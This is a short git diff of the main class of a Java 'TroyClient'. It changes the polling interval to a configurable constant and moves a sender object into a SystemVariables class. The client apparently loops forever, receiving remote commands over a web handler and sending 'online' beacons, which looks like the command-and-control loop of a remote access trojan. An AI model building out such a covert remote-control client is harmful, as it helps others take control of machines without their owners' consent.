@@ -2,7 +2,7 @@ package ch.lebois.troyclient;
 
 import ch.lebois.troyclient.main.CommandReciver;
 import ch.lebois.troyclient.main.ConfigureInit;
-import ch.lebois.troyclient.main.GetContext;
+import ch.lebois.troyclient.main.SystemVariables;
 
 public class TroyClient {
     public static void main(String[] args) throws InterruptedException {
@@ -12,9 +12,9 @@ public class TroyClient {
 
         CommandReciver commandReciver = new CommandReciver(init.getWebHandler());
         while (true) {
-            Thread.sleep(1000);
+            Thread.sleep(SystemVariables.REFRESHTIME);
             commandReciver.readCommands();
-            GetContext.SENDER.send("online", "");
+            SystemVariables.SENDER.send("online", "");
         }
     }
 }
